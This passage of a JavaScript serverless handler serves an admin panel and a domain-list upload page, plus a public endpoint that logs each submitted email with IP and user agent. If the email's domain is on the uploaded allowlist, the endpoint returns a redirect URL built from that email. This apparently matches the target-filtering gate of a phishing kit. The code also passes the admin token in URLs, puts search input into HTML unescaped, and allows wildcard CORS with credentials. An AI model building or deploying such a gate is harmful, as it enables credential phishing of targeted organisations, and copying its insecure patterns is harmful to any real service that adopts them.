  const endPage = Math.min(pagination.totalPages, startPage + maxPages - 1);
  
  for (let i = startPage; i <= endPage; i++) {
    if (i === pagination.currentPage) {
      paginationHtml += `<span class="page-link current">${i}</span>`;
    } else {
      paginationHtml += `<a href="?action=admin&token=${token}&view=${view}&format=html&page=${i}&search=${pagination.search || ''}" class="page-link">${i}</a>`;
    }
  }
  
  if (pagination.hasNextPage) {
    paginationHtml += `<a href="?action=admin&token=${token}&view=${view}&format=html&page=${pagination.currentPage + 1}&search=${pagination.search || ''}" class="page-link">Next</a>`;
  } else {
    paginationHtml += `<span class="page-link" style="color: #ccc;">Next</span>`;
  }
  
  paginationHtml += ` | <span>${pagination.totalCount} total records</span>`;
  paginationHtml += '</div>';
  return paginationHtml;
}

// Domain upload form HTML with upload and processing progress tracking
function getDomainUploadFormHtml(token) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Upload Domains</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        h1 { color: #2196F3; margin-bottom: 15px; }
        .container { max-width: 800px; margin: 0 auto; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="file"] { display: block; padding: 10px; background-color: #f9f9f9; border: 1px solid #ddd; width: 100%; border-radius: 4px; }
        button { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 4px; }
        button:disabled { background-color: #a5d6a7; cursor: not-allowed; }
        .back-link { display: inline-block; margin-top: 20px; color: #2196F3; text-decoration: none; }
        .result { margin-top: 20px; padding: 15px; border-radius: 4px; display: none; }
        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .info { background-color: #f8f9fa; color: #0c5460; border: 1px solid #bee5eb; padding: 15px; margin-bottom: 20px; border-radius: 4px; }
        
        /* Progress bar styles */
        .progress-section { margin-bottom: 15px; }
        .progress-container { margin: 20px 0; display: none; }
        .progress-label { font-weight: bold; margin-bottom: 5px; display: block; }
        .progress-bar { width: 100%; background-color: #e9ecef; border-radius: 4px; height: 25px; overflow: hidden; }
        .progress-fill { height: 100%; background-color: #4CAF50; width: 0%; transition: width 0.3s; }
        .progress-text { text-align: center; margin-top: 5px; color: #666; }
        .progress-status { margin-top: 10px; font-style: italic; color: #666; }
        .processing-stats { margin-top: 10px; font-size: 14px; }
        .stat-item { margin: 3px 0; }
        .stat-added { color: #28a745; }
        .stat-skipped { color: #ffc107; }
        .stat-failed { color: #dc3545; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Upload Allowed Domains</h1>
        
        <div class="info">
          <h3>Instructions:</h3>
          <p>Upload a TXT file containing domain names to add to the allowed domains list.</p>
          <ul>
            <li>The text file should have one domain per line</li>
            <li>Each domain should be in the format: example.com</li>
            <li>Large files may take a few moments to process</li>
          </ul>
        </div>
        
        <form id="uploadForm" enctype="multipart/form-data">
          <div class="form-group">
            <label for="file">Select TXT file:</label>
            <input type="file" id="file" name="file" accept=".txt" required>
          </div>
          
          <button type="submit" id="submitButton">Upload Domains</button>
        </form>
        
        <!-- Progress tracking elements -->
        <div id="progressContainer" class="progress-container">
          <!-- Upload progress -->
          <div class="progress-section">
            <span class="progress-label">File Upload:</span>
            <div class="progress-bar">
              <div id="uploadProgressFill" class="progress-fill"></div>
            </div>
            <div id="uploadProgressText" class="progress-text">0%</div>
            <div id="uploadProgressStatus" class="progress-status">Preparing upload...</div>
          </div>
          
          <!-- Processing progress (shown after upload completes) -->
          <div id="processingSection" class="progress-section" style="display: none;">
            <span class="progress-label">Domain Processing:</span>
            <div class="progress-bar">
              <div id="processingProgressFill" class="progress-fill"></div>
            </div>
            <div id="processingProgressText" class="progress-text">0%</div>
            <div id="processingProgressStatus" class="progress-status">Waiting for processing to begin...</div>
            
            <div id="processingStats" class="processing-stats">
              <div id="totalProcessed" class="stat-item">Total domains: 0</div>
              <div id="totalAdded" class="stat-item stat-added">Added: 0</div>
              <div id="totalSkipped" class="stat-item stat-skipped">Skipped: 0</div>
              <div id="totalFailed" class="stat-item stat-failed">Failed: 0</div>
            </div>
          </div>
        </div>
        
        <div id="resultSuccess" class="result success"></div>
        <div id="resultError" class="result error"></div>
        
        <a href="?action=admin&token=${token}&view=domains&format=html" class="back-link">← Back to Admin Panel</a>
      </div>
      
      <script>
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const fileInput = document.getElementById('file');
          if (!fileInput.files || fileInput.files.length === 0) {
            showError('Please select a file to upload');
            return;
          }
          
          const file = fileInput.files[0];
          if (!file.name.toLowerCase().endsWith('.txt')) {
            showError('Invalid file type. Please upload a TXT file.');
            return;
          }
          
          // Hide previous results
          document.getElementById('resultSuccess').style.display = 'none';
          document.getElementById('resultError').style.display = 'none';
          
          // Disable the submit button during upload
          document.getElementById('submitButton').disabled = true;
          
          // Show progress container and reset progress
          const progressContainer = document.getElementById('progressContainer');
          const uploadProgressFill = document.getElementById('uploadProgressFill');
          const uploadProgressText = document.getElementById('uploadProgressText');
          const uploadProgressStatus = document.getElementById('uploadProgressStatus');
          
          progressContainer.style.display = 'block';
          uploadProgressFill.style.width = '0%';
          uploadProgressText.textContent = '0%';
          uploadProgressStatus.textContent = 'Starting upload...';
          
          // Hide processing section until upload is complete
          document.getElementById('processingSection').style.display = 'none';
          
          const formData = new FormData();
          formData.append('file', file);
          formData.append('addedBy', 'txt-upload');
          
          // Log file info
          console.log('Uploading file:', file.name, 'Size:', file.size, 'Type:', file.type);
          
          // Use XMLHttpRequest for progress tracking
          const xhr = new XMLHttpRequest();
          
          // Upload progress event
          xhr.upload.addEventListener('progress', function(e) {
            if (e.lengthComputable) {
              const percentComplete = Math.round((e.loaded / e.total) * 100);
              uploadProgressFill.style.width = percentComplete + '%';
              uploadProgressText.textContent = percentComplete + '%';
              
              if (percentComplete < 100) {
                uploadProgressStatus.textContent = 'Uploading file...';
              } else {
                uploadProgressStatus.textContent = 'File uploaded. Initiating domain processing...';
                
                // Show processing section when upload is complete
                const processingSection = document.getElementById('processingSection');
                processingSection.style.display = 'block';
                
                // Set initial processing status
                document.getElementById('processingProgressStatus').textContent = 'Processing domains...';
                
                // Create a pulsing effect for the processing bar to indicate activity
                startProcessingPulse();
              }
              
              console.log('Upload progress:', percentComplete + '%');
            }
          });
          
          // Upload complete
          xhr.addEventListener('load', function() {
            console.log('Upload complete. Response status:', xhr.status);
            
            if (xhr.status >= 200 && xhr.status < 300) {
              try {
                const response = JSON.parse(xhr.responseText);
                console.log('Response data:', response);
                
                if (response.success) {
                  // Update the upload progress to complete
                  uploadProgressFill.style.width = '100%';
                  uploadProgressText.textContent = '100%';
                  uploadProgressStatus.textContent = 'File upload complete!';
                  
                  // Show the processing results
                  showProcessingResults(response);
                } else {
                  uploadProgressStatus.textContent = 'Error processing domains';
                  document.getElementById('processingSection').style.display = 'none';
                  setTimeout(() => {
                    progressContainer.style.display = 'none';
                    showError(response.message || 'Error processing domains');
                  }, 500);
                }
              } catch (error) {
                console.error('Error parsing response:', error);
                progressContainer.style.display = 'none';
                showError('Error parsing server response');
              }
            } else {
              console.error('Server returned error:', xhr.status);
              progressContainer.style.display = 'none';
              showError('Server error: ' + xhr.status);
            }
            
            // Re-enable the submit button
            document.getElementById('submitButton').disabled = false;
            
            // Stop the pulsing effect
            stopProcessingPulse();
          });
          
          // Error handling
          xhr.addEventListener('error', function() {
            console.error('Upload failed');
            progressContainer.style.display = 'none';
            showError('Connection error. Upload failed.');
            document.getElementById('submitButton').disabled = false;
            stopProcessingPulse();
          });
          
          xhr.addEventListener('abort', function() {
            console.log('Upload aborted');
            progressContainer.style.display = 'none';
            showError('Upload was aborted');
            document.getElementById('submitButton').disabled = false;
            stopProcessingPulse();
          });
          
          // Open and send the request
          xhr.open('POST', '?action=upload&token=${token}', true);
          xhr.send(formData);
        });
        
        // Create a pulsing animation for the processing bar
        let pulseInterval;
        function startProcessingPulse() {
          const processingFill = document.getElementById('processingProgressFill');
          const processingText = document.getElementById('processingProgressText');
          let direction = 1;
          let width = 15;
          
          // Clear any existing interval
          if (pulseInterval) clearInterval(pulseInterval);
          
          pulseInterval = setInterval(() => {
            if (width >= 90) direction = -1;
            if (width <= 15) direction = 1;
            
            width += direction * 1;
            processingFill.style.width = width + '%';
            processingText.textContent = 'Processing...';
          }, 50);
        }
        
        function stopProcessingPulse() {
          if (pulseInterval) {
            clearInterval(pulseInterval);
            pulseInterval = null;
          }
        }
        
        function showProcessingResults(response) {
          const processingSection = document.getElementById('processingSection');
          const processingProgressFill = document.getElementById('processingProgressFill');
          const processingProgressText = document.getElementById('processingProgressText');
          const processingProgressStatus = document.getElementById('processingProgressStatus');
          
          // Make sure we have results
          if (!response.results) {
            processingSection.style.display = 'none';
            showSuccess(response.message);
            return;
          }
          
          // Show processing section
          processingSection.style.display = 'block';
          
          // Stop the pulsing effect
          stopProcessingPulse();
          
          // Calculate progress percentage
          const total = response.results.totalProcessed || 0;
          const processed = (response.results.added || 0) + (response.results.skipped || 0) + (response.results.failed || 0);
          
          // Update progress bar to show complete
          processingProgressFill.style.width = '100%';
          processingProgressText.textContent = '100%';
          processingProgressStatus.textContent = 'Domain processing complete!';
          
          // Update stats
          document.getElementById('totalProcessed').textContent = \`Total domains: \${response.results.totalProcessed || 0}\`;
          document.getElementById('totalAdded').textContent = \`Added: \${response.results.added || 0}\`;
          document.getElementById('totalSkipped').textContent = \`Skipped: \${response.results.skipped || 0}\`;
          document.getElementById('totalFailed').textContent = \`Failed: \${response.results.failed || 0}\`;
          
          // Show success message
          setTimeout(() => {
            showSuccess(response.message);
          }, 500);
        }
        
        function showSuccess(message) {
          const successDiv = document.getElementById('resultSuccess');
          successDiv.textContent = message;
          successDiv.style.display = 'block';
        }
        
        function showError(message) {
          const errorDiv = document.getElementById('resultError');
          errorDiv.textContent = message;
          errorDiv.style.display = 'block';
        }
      </script>
    </body>
    </html>
  `;
}

// Disable default body parser for file uploads
export const config = {
  api: {
    bodyParser: false,
  },
};

// Main handler function
export default async function handler(req, res) {
  console.log(`Request received: ${req.method} ${req.url}`);
  
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  const userAgent = req.headers['user-agent'];
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  // Check admin token for protected endpoints
  const isAdmin = req.query.token === ADMIN_TOKEN || req.body?.token === ADMIN_TOKEN;
  
  // ADMIN PANEL - View emails and domains
 // Main handler function (continued)
  if (req.method === 'GET' && req.query.action === 'admin') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const page = parseInt(req.query.page) || 1;
      const pageSize = parseInt(req.query.pageSize) || 50;
      const search = req.query.search || '';
      const view = req.query.view || 'emails'; // 'emails' or 'domains'
      
      if (view === 'domains') {
        const { domains, pagination } = await getDomains(page, pageSize, search);
        
        if (req.query.format === 'html') {
          // HTML admin interface
          const adminHtml = getDomainsAdminHtml(domains, pagination, ADMIN_TOKEN);
          res.setHeader('Content-Type', 'text/html');
          return res.status(200).send(adminHtml);
        }
        
        return res.status(200).json({ domains, pagination });
      } else {
        const { emails, pagination } = await getEmails(page, pageSize, search);
        
        if (req.query.format === 'html') {
          // HTML admin interface
          const adminHtml = getEmailsAdminHtml(emails, pagination, ADMIN_TOKEN);
          res.setHeader('Content-Type', 'text/html');
          return res.status(200).send(adminHtml);
        }
        
        return res.status(200).json({ emails, pagination });
      }
    } catch (error) {
      console.error('Error in admin panel:', error);
      return res.status(500).json({ message: 'Error loading admin panel', error: error.message });
    }
  }
  
  // UPLOAD FORM - For adding domains via file upload
  if (req.method === 'GET' && req.query.action === 'uploadform') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    const uploadFormHtml = getDomainUploadFormHtml(ADMIN_TOKEN);
    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(uploadFormHtml);
  }
  
  // UPLOAD DOMAINS - Process file upload for domains
  if (req.method === 'POST' && req.query.action === 'upload') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    console.log('Processing file upload...');
    
    try {
      // Use a promise-based approach for formidable
      const parseForm = () => {
        return new Promise((resolve, reject) => {
          const form = new formidable.IncomingForm();
          form.parse(req, (err, fields, files) => {
            if (err) return reject(err);
            resolve({ fields, files });
          });
        });
      };
      
      // Parse the uploaded form
      const { fields, files } = await parseForm();
      console.log('Form parsed successfully');
      
      // Get the first file, regardless of structure
      const file = files.file || 
                   (files.file && files.file[0]) || 
                   Object.values(files)[0];
      
      if (!file) {
        console.error('No file found in request');
        return res.status(400).json({ success: false, message: 'No file uploaded' });
      }
      
      console.log('File details:', {
        name: file.originalFilename || file.name,
        path: file.filepath || file.path,
        size: file.size
      });
      
      // Read file content
      const filePath = file.filepath || file.path;
      const content = fs.readFileSync(filePath, 'utf8');
      
      console.log('File content length:', content.length);
      
      // Process domains - optimized for large files
      const addedBy = fields.addedBy || 'file-upload';
      const results = await processDomainTextContent(content, addedBy);
      
      console.log('Processing results:', {
        total: results.totalProcessed,
        added: results.added,
        skipped: results.skipped,
        failed: results.failed
      });
      
      return res.status(200).json({
        success: true,
        message: `Processed ${results.totalProcessed} domains. Added: ${results.added}, Skipped: ${results.skipped}, Failed: ${results.failed}`,
        results
      });
    } catch (error) {
      console.error('Error processing file:', error);
      return res.status(500).json({ 
        success: false, 
        message: 'Error processing file', 
        error: error.message 
      });
    }
  }
  
  // ADD DOMAIN - Add a single domain
  if (req.method === 'POST' && req.query.action === 'adddomain') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const domain = req.body.domain;
      
      if (!domain) {
        return res.status(400).json({ message: 'Please provide a domain' });
      }
      
      const domainRegex = /^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,}$/;
      if (!domainRegex.test(domain.toLowerCase())) {
        return res.status(400).json({ message: 'Invalid domain format' });
      }
      
      const result = await addDomain(domain, req.body.addedBy || 'admin');
      
      return res.status(200).json(result);
    } catch (error) {
      console.error('Error adding domain:', error);
      return res.status(500).json({ success: false, message: 'Error adding domain', error: error.message });
    }
  }
  
  // DELETE DOMAIN - Remove a domain
  if (req.method === 'POST' && req.query.action === 'deletedomain') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const domain = req.body.domain;
      
      if (!domain) {
        return res.status(400).json({ message: 'Please provide a domain to delete' });
      }
      
      const result = await deleteDomain(domain);
      
      return res.status(result.success ? 200 : 400).json(result);
    } catch (error) {
      console.error('Error deleting domain:', error);
      return res.status(500).json({ success: false, message: 'Error deleting domain', error: error.message });
    }
  }
  
  // BULK DELETE DOMAINS - Delete multiple domains at once
  if (req.method === 'POST' && req.query.action === 'bulkdeletedomain') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const domains = req.body.domains;
      
      if (!domains || !Array.isArray(domains) || domains.length === 0) {
        return res.status(400).json({ message: 'Please provide domains to delete' });
      }
      
      const result = await bulkDeleteDomains(domains);
      
      return res.status(result.success ? 200 : 400).json(result);
    } catch (error) {
      console.error('Error in bulk delete domains:', error);
      return res.status(500).json({ message: 'Unable to bulk delete domains', error: error.message });
    }
  }
  
  // DELETE ALL DOMAINS - Remove all domains
  if (req.method === 'POST' && req.query.action === 'deletealldomains') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const result = await removeAllDomains();
      
      return res.status(result.success ? 200 : 400).json(result);
    } catch (error) {
      console.error('Error deleting all domains:', error);
      return res.status(500).json({ message: 'Unable to delete all domains', error: error.message });
    }
  }
  
  // NEW: DELETE EMAIL - Remove a single email log
  if (req.method === 'POST' && req.query.action === 'deleteemail') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const id = req.body.id;
      
      if (!id) {
        return res.status(400).json({ message: 'Please provide an email ID to delete' });
      }
      
      const result = await deleteEmail(id);
      
      return res.status(result.success ? 200 : 400).json(result);
    } catch (error) {
      console.error('Error deleting email log:', error);
      return res.status(500).json({ success: false, message: 'Error deleting email log', error: error.message });
    }
  }
  
  // NEW: BULK DELETE EMAILS - Delete multiple email logs
  if (req.method === 'POST' && req.query.action === 'bulkdeleteemail') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const ids = req.body.ids;
      
      if (!ids || !Array.isArray(ids) || ids.length === 0) {
        return res.status(400).json({ message: 'Please provide email IDs to delete' });
      }
      
      const result = await bulkDeleteEmails(ids);
      
      return res.status(result.success ? 200 : 400).json(result);
    } catch (error) {
      console.error('Error in bulk delete emails:', error);
      return res.status(500).json({ message: 'Unable to bulk delete email logs', error: error.message });
    }
  }
  
  // NEW: DELETE ALL EMAILS - Remove all email logs
  if (req.method === 'POST' && req.query.action === 'deleteallemails') {
    if (!isAdmin) {
      return res.status(401).json({ message: 'Unauthorized' });
    }
    
    try {
      const result = await removeAllEmails();
      
      return res.status(result.success ? 200 : 400).json(result);
    } catch (error) {
      console.error('Error deleting all email logs:', error);
      return res.status(500).json({ message: 'Unable to delete all email logs', error: error.message });
    }
  }
  
  // EMAIL VERIFICATION - Validate email against allowed domains
  if (req.method === 'POST' && (!req.query.action || req.query.action === 'validate')) {
    try {
      const email = req.body.email;
      
      if (!email) {
        return res.status(400).json({ message: 'Please enter an email address' });
      }
      
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        return res.status(400).json({ message: 'Invalid email format' });
      }
      
      // Log email to database
      await logEmail(email, userAgent, ip);
      
      // Check if domain is allowed
      const domain = getDomainFromEmail(email);
      const allowed = await isDomainAllowed(domain);
      
      if (!allowed) {
        return res.status(400).json({ message: 'Please enter your work email address for verification' });
      }
      
      // Generate redirect URL using the environment variables
      const redirectUrl = generateRedirectUrl(email);
      
      return res.status(200).json({ 
        success: true,
        message: 'Email validated successfully',
        redirectUrl: redirectUrl
      });
    } catch (error) {
      console.error('Error validating email:', error);
      return res.status(500).json({ message: 'Unable to verify email. Please try again later.' });
    }
  }
  
  // If no route matched
  return res.status(405).json({ message: 'Method not allowed' });
}
